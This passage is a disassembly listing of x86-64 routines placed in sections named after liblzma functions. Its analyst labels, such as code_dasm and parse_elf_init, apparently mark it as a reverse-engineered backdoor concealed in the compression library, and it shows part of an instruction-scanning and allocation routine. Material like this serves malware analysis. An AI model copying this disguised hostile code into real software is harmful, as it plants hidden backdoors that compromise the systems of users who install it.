.text.lzma_index_iter_locata:0000000000004E2E                 and     edx, 8
.text.lzma_index_iter_locata:0000000000004E31                 or      eax, edx
.text.lzma_index_iter_locata:0000000000004E33                 jmp     short loc_4E37
.text.lzma_index_iter_locata:0000000000004E35 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004E35
.text.lzma_index_iter_locata:0000000000004E35 loc_4E35:                               ; CODE XREF: _Llzma_index_iter_locate_1+308↑j
.text.lzma_index_iter_locata:0000000000004E35                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004E37
.text.lzma_index_iter_locata:0000000000004E37 loc_4E37:                               ; CODE XREF: _Llzma_index_iter_locate_1+328↑j
.text.lzma_index_iter_locata:0000000000004E37                                         ; _Llzma_index_iter_locate_1+337↑j ...
.text.lzma_index_iter_locata:0000000000004E37                 cmp     r10b, al
.text.lzma_index_iter_locata:0000000000004E3A                 jnz     short loc_4E87
.text.lzma_index_iter_locata:0000000000004E3C                 mov     rdi, [rsp+0A8h+var_40]
.text.lzma_index_iter_locata:0000000000004E41                 cmp     rdi, 0FFh
.text.lzma_index_iter_locata:0000000000004E48                 ja      short loc_4E53
.text.lzma_index_iter_locata:0000000000004E4A                 call    count_1_bits    ; PIC mode
.text.lzma_index_iter_locata:0000000000004E4F                 dec     eax
.text.lzma_index_iter_locata:0000000000004E51                 jz      short loc_4E5D
.text.lzma_index_iter_locata:0000000000004E53
.text.lzma_index_iter_locata:0000000000004E53 loc_4E53:                               ; CODE XREF: _Llzma_index_iter_locate_1+378↑j
.text.lzma_index_iter_locata:0000000000004E53                                         ; _Llzma_index_iter_locate_1+3AE↓j
.text.lzma_index_iter_locata:0000000000004E53                 mov     dword ptr [r13+28h], 1
.text.lzma_index_iter_locata:0000000000004E5B                 jmp     short loc_4EBF
.text.lzma_index_iter_locata:0000000000004E5D ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004E5D
.text.lzma_index_iter_locata:0000000000004E5D loc_4E5D:                               ; CODE XREF: _Llzma_index_iter_locate_1+381↑j
.text.lzma_index_iter_locata:0000000000004E5D                 mov     rdx, [r12]
.text.lzma_index_iter_locata:0000000000004E61                 mov     eax, [r13+10h]
.text.lzma_index_iter_locata:0000000000004E65                 mov     rcx, [r13+30h]
.text.lzma_index_iter_locata:0000000000004E69                 add     rax, [rdx]
.text.lzma_index_iter_locata:0000000000004E6C                 mov     rdx, [rsp+0A8h+var_40]
.text.lzma_index_iter_locata:0000000000004E71                 mov     [rcx+60h], rax
.text.lzma_index_iter_locata:0000000000004E75                 mov     [rcx+68h], dl
.text.lzma_index_iter_locata:0000000000004E78                 movzx   eax, byte ptr [rax]
.text.lzma_index_iter_locata:0000000000004E7B                 test    rax, rdx
.text.lzma_index_iter_locata:0000000000004E7E                 jnz     short loc_4E53
.text.lzma_index_iter_locata:0000000000004E80                 mov     eax, 1
.text.lzma_index_iter_locata:0000000000004E85                 jmp     short loc_4EC1
.text.lzma_index_iter_locata:0000000000004E87 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004E87
.text.lzma_index_iter_locata:0000000000004E87 loc_4E87:                               ; CODE XREF: _Llzma_index_iter_locate_1+119↑j
.text.lzma_index_iter_locata:0000000000004E87                                         ; _Llzma_index_iter_locate_1+12D↑j ...
.text.lzma_index_iter_locata:0000000000004E87                 add     r15, [rsp+0A8h+var_78]
.text.lzma_index_iter_locata:0000000000004E8C                 jmp     loc_4BA2
.text.lzma_index_iter_locata:0000000000004E91 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004E91
.text.lzma_index_iter_locata:0000000000004E91 loc_4E91:                               ; CODE XREF: _Llzma_index_iter_locate_1+D9↑j
.text.lzma_index_iter_locata:0000000000004E91                 mov     rax, [r12+8]
.text.lzma_index_iter_locata:0000000000004E96                 mov     rsi, rbx
.text.lzma_index_iter_locata:0000000000004E99                 mov     rax, [rax+20h]
.text.lzma_index_iter_locata:0000000000004E9D                 mov     [rbx+10h], rax
.text.lzma_index_iter_locata:0000000000004EA1                 mov     rax, [r13+38h]
.text.lzma_index_iter_locata:0000000000004EA5                 mov     rdi, [rax+0A8h]
.text.lzma_index_iter_locata:0000000000004EAC                 call    lzma_free       ; PIC mode
.text.lzma_index_iter_locata:0000000000004EB1                 mov     rdi, [r14+10h]
.text.lzma_index_iter_locata:0000000000004EB5                 mov     rsi, [rsp+0A8h+var_A0]
.text.lzma_index_iter_locata:0000000000004EBA                 call    lzma_free       ; PIC mode
.text.lzma_index_iter_locata:0000000000004EBF
.text.lzma_index_iter_locata:0000000000004EBF loc_4EBF:                               ; CODE XREF: _Llzma_index_iter_locate_1+2F↑j
.text.lzma_index_iter_locata:0000000000004EBF                                         ; _Llzma_index_iter_locate_1+F8↑j ...
.text.lzma_index_iter_locata:0000000000004EBF                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004EC1
.text.lzma_index_iter_locata:0000000000004EC1 loc_4EC1:                               ; CODE XREF: _Llzma_index_iter_locate_1+3B5↑j
.text.lzma_index_iter_locata:0000000000004EC1                 sub     rsp, 0FFFFFFFFFFFFFF80h
.text.lzma_index_iter_locata:0000000000004EC5                 pop     rbx
.text.lzma_index_iter_locata:0000000000004EC6                 pop     r12
.text.lzma_index_iter_locata:0000000000004EC8                 pop     r13
.text.lzma_index_iter_locata:0000000000004ECA                 pop     r14
.text.lzma_index_iter_locata:0000000000004ECC                 pop     r15
.text.lzma_index_iter_locata:0000000000004ECE                 retn
.text.lzma_index_iter_locata:0000000000004ECE _Llzma_index_iter_locate_1 endp
.text.lzma_index_iter_locata:0000000000004ECE
.text.lzma_index_iter_locata:0000000000004ECE _text_lzma_index_iter_locata ends
.text.lzma_index_iter_locata:0000000000004ECE
.text.lzma_index_hash_inia:0000000000004ED0 ; ===========================================================================
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0 ; Segment type: Pure code
.text.lzma_index_hash_inia:0000000000004ED0 ; Segment permissions: Read/Execute
.text.lzma_index_hash_inia:0000000000004ED0 _text_lzma_index_hash_inia segment para public 'CODE' use64
.text.lzma_index_hash_inia:0000000000004ED0                 assume cs:_text_lzma_index_hash_inia
.text.lzma_index_hash_inia:0000000000004ED0                 ;org 4ED0h
.text.lzma_index_hash_inia:0000000000004ED0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0 ; __int64 __fastcall Llzma_index_hash_init_part_0(__int64, unsigned __int64, __int64, __int64)
.text.lzma_index_hash_inia:0000000000004ED0 _Llzma_index_hash_init_part_0 proc near ; CODE XREF: _Llzma_lz_decoder_init_0+1AA↓p
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0 var_E8          = qword ptr -0E8h
.text.lzma_index_hash_inia:0000000000004ED0 var_E0          = qword ptr -0E0h
.text.lzma_index_hash_inia:0000000000004ED0 var_D8          = qword ptr -0D8h
.text.lzma_index_hash_inia:0000000000004ED0 var_D0          = qword ptr -0D0h
.text.lzma_index_hash_inia:0000000000004ED0 var_C8          = dword ptr -0C8h
.text.lzma_index_hash_inia:0000000000004ED0 var_C4          = dword ptr -0C4h
.text.lzma_index_hash_inia:0000000000004ED0 var_C0          = qword ptr -0C0h
.text.lzma_index_hash_inia:0000000000004ED0 var_B8          = qword ptr -0B8h
.text.lzma_index_hash_inia:0000000000004ED0 var_B0          = dword ptr -0B0h
.text.lzma_index_hash_inia:0000000000004ED0 var_AC          = byte ptr -0ACh
.text.lzma_index_hash_inia:0000000000004ED0 var_A8          = qword ptr -0A8h
.text.lzma_index_hash_inia:0000000000004ED0 var_A0          = qword ptr -0A0h
.text.lzma_index_hash_inia:0000000000004ED0 var_98          = dword ptr -98h
.text.lzma_index_hash_inia:0000000000004ED0 var_90          = qword ptr -90h
.text.lzma_index_hash_inia:0000000000004ED0 var_88          = qword ptr -88h
.text.lzma_index_hash_inia:0000000000004ED0 var_80          = qword ptr -80h
.text.lzma_index_hash_inia:0000000000004ED0 var_78          = qword ptr -78h
.text.lzma_index_hash_inia:0000000000004ED0 var_70          = dword ptr -70h
.text.lzma_index_hash_inia:0000000000004ED0 var_65          = byte ptr -65h
.text.lzma_index_hash_inia:0000000000004ED0 var_63          = byte ptr -63h
.text.lzma_index_hash_inia:0000000000004ED0 var_62          = byte ptr -62h
.text.lzma_index_hash_inia:0000000000004ED0 var_61          = byte ptr -61h
.text.lzma_index_hash_inia:0000000000004ED0 var_60          = byte ptr -60h
.text.lzma_index_hash_inia:0000000000004ED0 var_58          = dword ptr -58h
.text.lzma_index_hash_inia:0000000000004ED0 var_50          = qword ptr -50h
.text.lzma_index_hash_inia:0000000000004ED0
.text.lzma_index_hash_inia:0000000000004ED0                 endbr64
.text.lzma_index_hash_inia:0000000000004ED4                 push    r15
.text.lzma_index_hash_inia:0000000000004ED6                 push    r14
.text.lzma_index_hash_inia:0000000000004ED8                 mov     r14, rcx
.text.lzma_index_hash_inia:0000000000004EDB                 xor     ecx, ecx
.text.lzma_index_hash_inia:0000000000004EDD                 push    r13
.text.lzma_index_hash_inia:0000000000004EDF                 push    r12
.text.lzma_index_hash_inia:0000000000004EE1                 mov     r12, rdx
.text.lzma_index_hash_inia:0000000000004EE4                 mov     edx, 8
.text.lzma_index_hash_inia:0000000000004EE9                 push    rbx
.text.lzma_index_hash_inia:0000000000004EEA                 sub     rsp, 0C0h
.text.lzma_index_hash_inia:0000000000004EF1                 mov     [rsp+0E8h+var_E8], rdi
.text.lzma_index_hash_inia:0000000000004EF5                 mov     edi, 85h
.text.lzma_index_hash_inia:0000000000004EFA                 mov     [rsp+0E8h+var_E0], rsi
.text.lzma_index_hash_inia:0000000000004EFF                 mov     esi, 12h
.text.lzma_index_hash_inia:0000000000004F04                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_index_hash_inia:0000000000004F09                 test    eax, eax
.text.lzma_index_hash_inia:0000000000004F0B                 jz      loc_4FE6
.text.lzma_index_hash_inia:0000000000004F11                 xor     eax, eax
.text.lzma_index_hash_inia:0000000000004F13                 lea     rdi, [rsp+0E8h+var_80]
.text.lzma_index_hash_inia:0000000000004F18                 mov     ecx, 16h
.text.lzma_index_hash_inia:0000000000004F1D                 mov     r13, [r14+118h]
.text.lzma_index_hash_inia:0000000000004F24                 rep stosd
.text.lzma_index_hash_inia:0000000000004F26                 xor     eax, eax
.text.lzma_index_hash_inia:0000000000004F28                 mov     edi, 1          ; _QWORD
.text.lzma_index_hash_inia:0000000000004F2D                 mov     [rsp+0E8h+var_C8], eax
.text.lzma_index_hash_inia:0000000000004F31                 mov     [rsp+0E8h+var_C4], eax
.text.lzma_index_hash_inia:0000000000004F35                 call    get_lzma_allocator ; PIC mode
.text.lzma_index_hash_inia:0000000000004F3A                 mov     edi, 380h
.text.lzma_index_hash_inia:0000000000004F3F                 mov     rsi, rax
.text.lzma_index_hash_inia:0000000000004F42                 mov     rax, [rsp+0E8h+var_E8]
.text.lzma_index_hash_inia:0000000000004F46                 mov     [rsp+0E8h+var_D0], rsi
.text.lzma_index_hash_inia:0000000000004F4B                 mov     rax, [rax+8]
.text.lzma_index_hash_inia:0000000000004F4F                 mov     rax, [rax+10h]
.text.lzma_index_hash_inia:0000000000004F53                 mov     [rsi+10h], rax
.text.lzma_index_hash_inia:0000000000004F57                 call    lzma_alloc      ; PIC mode
.text.lzma_index_hash_inia:0000000000004F5C                 mov     rsi, [rsp+0E8h+var_D0]
.text.lzma_index_hash_inia:0000000000004F61                 mov     [r13+38h], rax
.text.lzma_index_hash_inia:0000000000004F65                 test    rax, rax
.text.lzma_index_hash_inia:0000000000004F68                 lea     rax, [rsp+0E8h+var_80]
.text.lzma_index_hash_inia:0000000000004F6D                 mov     [rsp+0E8h+var_D8], rax
.text.lzma_index_hash_inia:0000000000004F72                 jz      short loc_4F78
.text.lzma_index_hash_inia:0000000000004F74                 inc     dword ptr [r13+0]
.text.lzma_index_hash_inia:0000000000004F78
.text.lzma_index_hash_inia:0000000000004F78 loc_4F78:                               ; CODE XREF: _Llzma_index_hash_init_part_0+A2↑j
.text.lzma_index_hash_inia:0000000000004F78                 mov     rbx, [r12+100h]
.text.lzma_index_hash_inia:0000000000004F80                 mov     r15, [r12+108h]
.text.lzma_index_hash_inia:0000000000004F88                 mov     edi, 690h
.text.lzma_index_hash_inia:0000000000004F8D                 mov     byte ptr [rsp+0E8h+var_C8+2], 0FFh
.text.lzma_index_hash_inia:0000000000004F92                 or      word ptr [rsp+0E8h+var_C8], 80h
.text.lzma_index_hash_inia:0000000000004F99                 or      word ptr [rsp+0E8h+var_C4], 2
.text.lzma_index_hash_inia:0000000000004F9F                 add     r15, rbx
.text.lzma_index_hash_inia:0000000000004FA2                 mov     byte ptr [rsp+0E8h+var_C4+2], 0FFh
.text.lzma_index_hash_inia:0000000000004FA7                 call    lzma_alloc      ; PIC mode
.text.lzma_index_hash_inia:0000000000004FAC                 mov     [r13+40h], rax
.text.lzma_index_hash_inia:0000000000004FB0                 test    rax, rax
.text.lzma_index_hash_inia:0000000000004FB3                 jz      short loc_4FCD
.text.lzma_index_hash_inia:0000000000004FB5                 inc     dword ptr [r13+0]
.text.lzma_index_hash_inia:0000000000004FB9                 jmp     short loc_4FCD
.text.lzma_index_hash_inia:0000000000004FBB ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:0000000000004FBB
.text.lzma_index_hash_inia:0000000000004FBB loc_4FBB:                               ; CODE XREF: _Llzma_index_hash_init_part_0+114↓j
.text.lzma_index_hash_inia:0000000000004FBB                 cmp     [rsp+0E8h+var_58], 1036h
.text.lzma_index_hash_inia:0000000000004FC6                 jz      short loc_4FED
.text.lzma_index_hash_inia:0000000000004FC8
.text.lzma_index_hash_inia:0000000000004FC8 loc_4FC8:                               ; CODE XREF: _Llzma_index_hash_init_part_0+12B↓j
.text.lzma_index_hash_inia:0000000000004FC8                                         ; _Llzma_index_hash_init_part_0+138↓j ...
.text.lzma_index_hash_inia:0000000000004FC8                 add     rbx, [rsp+0E8h+var_78]
.text.lzma_index_hash_inia:0000000000004FCD
.text.lzma_index_hash_inia:0000000000004FCD loc_4FCD:                               ; CODE XREF: _Llzma_index_hash_init_part_0+E3↑j
.text.lzma_index_hash_inia:0000000000004FCD                                         ; _Llzma_index_hash_init_part_0+E9↑j
.text.lzma_index_hash_inia:0000000000004FCD                 cmp     rbx, r15
.text.lzma_index_hash_inia:0000000000004FD0                 jnb     short loc_4FE6
.text.lzma_index_hash_inia:0000000000004FD2                 mov     rdi, [rsp+0E8h+var_D8]
.text.lzma_index_hash_inia:0000000000004FD7                 mov     rdx, r15
.text.lzma_index_hash_inia:0000000000004FDA                 mov     rsi, rbx
.text.lzma_index_hash_inia:0000000000004FDD                 call    code_dasm       ; PIC mode
.text.lzma_index_hash_inia:0000000000004FE2                 test    eax, eax
.text.lzma_index_hash_inia:0000000000004FE4                 jnz     short loc_4FBB
.text.lzma_index_hash_inia:0000000000004FE6
.text.lzma_index_hash_inia:0000000000004FE6 loc_4FE6:                               ; CODE XREF: _Llzma_index_hash_init_part_0+3B↑j
.text.lzma_index_hash_inia:0000000000004FE6                                         ; _Llzma_index_hash_init_part_0+100↑j ...
.text.lzma_index_hash_inia:0000000000004FE6                 xor     eax, eax
.text.lzma_index_hash_inia:0000000000004FE8                 jmp     loc_51B5
.text.lzma_index_hash_inia:0000000000004FED ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:0000000000004FED
.text.lzma_index_hash_inia:0000000000004FED loc_4FED:                               ; CODE XREF: _Llzma_index_hash_init_part_0+F6↑j
.text.lzma_index_hash_inia:0000000000004FED                 mov     ecx, [rsp+0E8h+var_70]
.text.lzma_index_hash_inia:0000000000004FF1                 mov     eax, ecx
.text.lzma_index_hash_inia:0000000000004FF3                 and     ax, 140h
.text.lzma_index_hash_inia:0000000000004FF7                 cmp     ax, 140h
.text.lzma_index_hash_inia:0000000000004FFB                 jnz     short loc_4FC8
.text.lzma_index_hash_inia:0000000000004FFD                 mov     al, [rsp+0E8h+var_63]
.text.lzma_index_hash_inia:0000000000005004                 dec     eax
.text.lzma_index_hash_inia:0000000000005006                 cmp     al, 1
.text.lzma_index_hash_inia:0000000000005008                 ja      short loc_4FC8
.text.lzma_index_hash_inia:000000000000500A                 mov     al, byte ptr [rsp+0E8h+var_70]
.text.lzma_index_hash_inia:000000000000500E                 mov     sil, byte ptr [rsp+0E8h+var_70+1]
.text.lzma_index_hash_inia:0000000000005013                 and     cx, 1040h
.text.lzma_index_hash_inia:0000000000005018                 mov     r9d, eax
.text.lzma_index_hash_inia:000000000000501B                 and     r9b, 40h
.text.lzma_index_hash_inia:000000000000501F                 jnz     short loc_502A
.text.lzma_index_hash_inia:0000000000005021                 xor     edx, edx
.text.lzma_index_hash_inia:0000000000005023                 test    cx, cx
.text.lzma_index_hash_inia:0000000000005026                 jnz     short loc_5072
.text.lzma_index_hash_inia:0000000000005028                 jmp     short loc_5094
.text.lzma_index_hash_inia:000000000000502A ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:000000000000502A
.text.lzma_index_hash_inia:000000000000502A loc_502A:                               ; CODE XREF: _Llzma_index_hash_init_part_0+14F↑j
.text.lzma_index_hash_inia:000000000000502A                 and     al, 20h
.text.lzma_index_hash_inia:000000000000502C                 mov     r9b, [rsp+0E8h+var_61]
.text.lzma_index_hash_inia:0000000000005034                 mov     edx, eax
.text.lzma_index_hash_inia:0000000000005036                 jnz     short loc_5046
.text.lzma_index_hash_inia:0000000000005038                 test    cx, cx
.text.lzma_index_hash_inia:000000000000503B                 jz      short loc_5094
.text.lzma_index_hash_inia:000000000000503D                 mov     dl, [rsp+0E8h+var_62]
.text.lzma_index_hash_inia:0000000000005044                 jmp     short loc_5094
.text.lzma_index_hash_inia:0000000000005046 ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:0000000000005046
.text.lzma_index_hash_inia:0000000000005046 loc_5046:                               ; CODE XREF: _Llzma_index_hash_init_part_0+166↑j
.text.lzma_index_hash_inia:0000000000005046                 movzx   eax, [rsp+0E8h+var_65]
.text.lzma_index_hash_inia:000000000000504E                 lea     edx, ds:0[rax*8]
.text.lzma_index_hash_inia:0000000000005055                 and     edx, 8
.text.lzma_index_hash_inia:0000000000005058                 or      r9d, edx
.text.lzma_index_hash_inia:000000000000505B                 xor     edx, edx
.text.lzma_index_hash_inia:000000000000505D                 test    cx, cx
.text.lzma_index_hash_inia:0000000000005060                 jz      short loc_5094
.text.lzma_index_hash_inia:0000000000005062                 add     eax, eax
.text.lzma_index_hash_inia:0000000000005064                 and     eax, 8
.text.lzma_index_hash_inia:0000000000005067                 or      al, [rsp+0E8h+var_62]
.text.lzma_index_hash_inia:000000000000506E                 mov     edx, eax
.text.lzma_index_hash_inia:0000000000005070                 jmp     short loc_5094
.text.lzma_index_hash_inia:0000000000005072 ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:0000000000005072
.text.lzma_index_hash_inia:0000000000005072 loc_5072:                               ; CODE XREF: _Llzma_index_hash_init_part_0+156↑j
.text.lzma_index_hash_inia:0000000000005072                 mov     edx, esi
.text.lzma_index_hash_inia:0000000000005074                 and     dl, 10h
.text.lzma_index_hash_inia:0000000000005077                 jz      short loc_5094
.text.lzma_index_hash_inia:0000000000005079                 mov     dl, [rsp+0E8h+var_60]
.text.lzma_index_hash_inia:0000000000005080                 test    al, 20h
.text.lzma_index_hash_inia:0000000000005082                 jz      short loc_5094
.text.lzma_index_hash_inia:0000000000005084                 movzx   eax, [rsp+0E8h+var_65]
.text.lzma_index_hash_inia:000000000000508C                 shl     eax, 3
.text.lzma_index_hash_inia:000000000000508F                 and     eax, 8
.text.lzma_index_hash_inia:0000000000005092                 or      edx, eax
.text.lzma_index_hash_inia:0000000000005094
.text.lzma_index_hash_inia:0000000000005094 loc_5094:                               ; CODE XREF: _Llzma_index_hash_init_part_0+158↑j
.text.lzma_index_hash_inia:0000000000005094                                         ; _Llzma_index_hash_init_part_0+16B↑j ...
.text.lzma_index_hash_inia:0000000000005094                 and     sil, 1
.text.lzma_index_hash_inia:0000000000005098                 mov     r8, [rsp+0E8h+var_78]
.text.lzma_index_hash_inia:000000000000509D                 jz      loc_4FC8
.text.lzma_index_hash_inia:00000000000050A3                 mov     eax, [rsp+84h]
.text.lzma_index_hash_inia:00000000000050AA                 mov     rsi, [rsp+0E8h+var_50]
.text.lzma_index_hash_inia:00000000000050B2                 and     eax, 0FF00FF00h
.text.lzma_index_hash_inia:00000000000050B7                 cmp     eax, 5000000h
.text.lzma_index_hash_inia:00000000000050BC                 jnz     short loc_50C6
.text.lzma_index_hash_inia:00000000000050BE                 add     rsi, [rsp+0E8h+var_80]
.text.lzma_index_hash_inia:00000000000050C3                 add     rsi, r8
.text.lzma_index_hash_inia:00000000000050C6
.text.lzma_index_hash_inia:00000000000050C6 loc_50C6:                               ; CODE XREF: _Llzma_index_hash_init_part_0+1EC↑j
.text.lzma_index_hash_inia:00000000000050C6                 mov     rax, [rsp+0E8h+var_E0]
.text.lzma_index_hash_inia:00000000000050CB                 cmp     rsi, rax
.text.lzma_index_hash_inia:00000000000050CE                 jnb     loc_4FC8
.text.lzma_index_hash_inia:00000000000050D4                 test    rsi, rsi
.text.lzma_index_hash_inia:00000000000050D7                 jz      loc_4FC8
.text.lzma_index_hash_inia:00000000000050DD                 xor     eax, eax
.text.lzma_index_hash_inia:00000000000050DF                 lea     rdi, [rsp+0E8h+var_C0]
.text.lzma_index_hash_inia:00000000000050E4                 mov     ecx, 10h
.text.lzma_index_hash_inia:00000000000050E9                 rep stosd
.text.lzma_index_hash_inia:00000000000050EB                 movzx   edi, word ptr [rsp+0E8h+var_C8]
.text.lzma_index_hash_inia:00000000000050F0                 mov     ecx, r9d
.text.lzma_index_hash_inia:00000000000050F3                 lea     r10, [rsp+0E8h+var_C0]
.text.lzma_index_hash_inia:00000000000050F8                 sar     edi, cl
.text.lzma_index_hash_inia:00000000000050FA                 mov     ecx, edi
.text.lzma_index_hash_inia:00000000000050FC                 and     ecx, 1
.text.lzma_index_hash_inia:00000000000050FF                 mov     r11d, ecx
.text.lzma_index_hash_inia:0000000000005102                 jz      short loc_5139
.text.lzma_index_hash_inia:0000000000005104                 mov     byte ptr [rsp+0E8h+var_C8+2], dl
.text.lzma_index_hash_inia:0000000000005108                 lea     rdx, [rsp+0E8h+var_AC]
.text.lzma_index_hash_inia:000000000000510D                 mov     ecx, 7
.text.lzma_index_hash_inia:0000000000005112                 add     r8, rbx
.text.lzma_index_hash_inia:0000000000005115                 mov     rdi, rdx
.text.lzma_index_hash_inia:0000000000005118                 mov     [rsp+0E8h+var_C0], r8
.text.lzma_index_hash_inia:000000000000511D                 rep stosd
.text.lzma_index_hash_inia:000000000000511F                 lea     rax, [rsp+0E8h+var_C8]
.text.lzma_index_hash_inia:0000000000005124                 mov     [rsp+0E8h+var_B8], r15
.text.lzma_index_hash_inia:0000000000005129                 mov     [rsp+0E8h+var_A8], rax
.text.lzma_index_hash_inia:000000000000512E                 lea     rax, [rsp+0E8h+var_C4]
.text.lzma_index_hash_inia:0000000000005133                 mov     [rsp+0E8h+var_B0], esi
.text.lzma_index_hash_inia:0000000000005137                 jmp     short loc_5181
.text.lzma_index_hash_inia:0000000000005139 ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:0000000000005139
.text.lzma_index_hash_inia:0000000000005139 loc_5139:                               ; CODE XREF: _Llzma_index_hash_init_part_0+232↑j
.text.lzma_index_hash_inia:0000000000005139                 movzx   eax, word ptr [rsp+0E8h+var_C4]
.text.lzma_index_hash_inia:000000000000513E                 mov     ecx, r9d
.text.lzma_index_hash_inia:0000000000005141                 sar     eax, cl
.text.lzma_index_hash_inia:0000000000005143                 test    al, 1
.text.lzma_index_hash_inia:0000000000005145                 jz      loc_4FC8
.text.lzma_index_hash_inia:000000000000514B                 mov     byte ptr [rsp+0E8h+var_C4+2], dl
.text.lzma_index_hash_inia:000000000000514F                 add     r8, rbx
.text.lzma_index_hash_inia:0000000000005152                 lea     rdx, [rsp+0E8h+var_AC]
.text.lzma_index_hash_inia:0000000000005157                 mov     eax, r11d
.text.lzma_index_hash_inia:000000000000515A                 mov     ecx, 7
.text.lzma_index_hash_inia:000000000000515F                 mov     rdi, rdx
.text.lzma_index_hash_inia:0000000000005162                 mov     [rsp+0E8h+var_C0], r8
.text.lzma_index_hash_inia:0000000000005167                 rep stosd
.text.lzma_index_hash_inia:0000000000005169                 mov     [rsp+0E8h+var_B8], r15
.text.lzma_index_hash_inia:000000000000516E                 lea     rax, [rsp+0E8h+var_C4]
.text.lzma_index_hash_inia:0000000000005173                 mov     [rsp+0E8h+var_B0], esi
.text.lzma_index_hash_inia:0000000000005177                 mov     [rsp+0E8h+var_A8], rax
.text.lzma_index_hash_inia:000000000000517C                 lea     rax, [rsp+0E8h+var_C8]
.text.lzma_index_hash_inia:0000000000005181
.text.lzma_index_hash_inia:0000000000005181 loc_5181:                               ; CODE XREF: _Llzma_index_hash_init_part_0+267↑j
.text.lzma_index_hash_inia:0000000000005181                 mov     rdi, [rsp+0E8h+var_E8]
.text.lzma_index_hash_inia:0000000000005185                 mov     rsi, r10
.text.lzma_index_hash_inia:0000000000005188                 mov     [rsp+0E8h+var_A0], rax
.text.lzma_index_hash_inia:000000000000518D                 mov     [rsp+0E8h+var_90], r12
.text.lzma_index_hash_inia:0000000000005192                 mov     [rsp+0E8h+var_88], r14
.text.lzma_index_hash_inia:0000000000005197                 call    _Llzma_index_iter_locate_1 ; PIC mode
.text.lzma_index_hash_inia:000000000000519C                 test    eax, eax
.text.lzma_index_hash_inia:000000000000519E                 jnz     short loc_51B0
.text.lzma_index_hash_inia:00000000000051A0                 cmp     [rsp+0E8h+var_98], 0
.text.lzma_index_hash_inia:00000000000051A5                 jz      loc_4FC8
.text.lzma_index_hash_inia:00000000000051AB                 jmp     loc_4FE6
.text.lzma_index_hash_inia:00000000000051B0 ; ---------------------------------------------------------------------------
.text.lzma_index_hash_inia:00000000000051B0
.text.lzma_index_hash_inia:00000000000051B0 loc_51B0:                               ; CODE XREF: _Llzma_index_hash_init_part_0+2CE↑j
.text.lzma_index_hash_inia:00000000000051B0                 mov     eax, 1
.text.lzma_index_hash_inia:00000000000051B5
.text.lzma_index_hash_inia:00000000000051B5 loc_51B5:                               ; CODE XREF: _Llzma_index_hash_init_part_0+118↑j
.text.lzma_index_hash_inia:00000000000051B5                 add     rsp, 0C0h
.text.lzma_index_hash_inia:00000000000051BC                 pop     rbx
.text.lzma_index_hash_inia:00000000000051BD                 pop     r12
.text.lzma_index_hash_inia:00000000000051BF                 pop     r13
.text.lzma_index_hash_inia:00000000000051C1                 pop     r14
.text.lzma_index_hash_inia:00000000000051C3                 pop     r15
.text.lzma_index_hash_inia:00000000000051C5                 retn
.text.lzma_index_hash_inia:00000000000051C5 _Llzma_index_hash_init_part_0 endp
.text.lzma_index_hash_inia:00000000000051C5
.text.lzma_index_hash_inia:00000000000051C5 _text_lzma_index_hash_inia ends
.text.lzma_index_hash_inia:00000000000051C5
.text.lzma_lz_decoder_inia:00000000000051D0 ; ===========================================================================
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0 ; Segment type: Pure code
.text.lzma_lz_decoder_inia:00000000000051D0 ; Segment permissions: Read/Execute
.text.lzma_lz_decoder_inia:00000000000051D0 _text_lzma_lz_decoder_inia segment para public 'CODE' use64
.text.lzma_lz_decoder_inia:00000000000051D0                 assume cs:_text_lzma_lz_decoder_inia
.text.lzma_lz_decoder_inia:00000000000051D0                 ;org 51D0h
.text.lzma_lz_decoder_inia:00000000000051D0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0 ; =============== S U B R O U T I N E =======================================
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0 ; __int64 __fastcall Llzma_lz_decoder_init_0(__int64, _QWORD *, _QWORD *, __int64)
.text.lzma_lz_decoder_inia:00000000000051D0 _Llzma_lz_decoder_init_0 proc near      ; CODE XREF: parse_elf_init+510↓p
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0 var_30          = qword ptr -30h
.text.lzma_lz_decoder_inia:00000000000051D0
.text.lzma_lz_decoder_inia:00000000000051D0                 endbr64
.text.lzma_lz_decoder_inia:00000000000051D4                 push    r15
.text.lzma_lz_decoder_inia:00000000000051D6                 mov     r15, rsi
.text.lzma_lz_decoder_inia:00000000000051D9                 mov     esi, 0Ah
.text.lzma_lz_decoder_inia:00000000000051DE                 push    r14
.text.lzma_lz_decoder_inia:00000000000051E0                 push    r13
.text.lzma_lz_decoder_inia:00000000000051E2                 mov     r13, rdi
.text.lzma_lz_decoder_inia:00000000000051E5                 xor     edi, edi
.text.lzma_lz_decoder_inia:00000000000051E7                 push    r12
.text.lzma_lz_decoder_inia:00000000000051E9                 mov     r12, rdx
.text.lzma_lz_decoder_inia:00000000000051EC                 xor     edx, edx
.text.lzma_lz_decoder_inia:00000000000051EE                 push    rbx
.text.lzma_lz_decoder_inia:00000000000051EF                 mov     rbx, rcx
.text.lzma_lz_decoder_inia:00000000000051F2                 xor     ecx, ecx
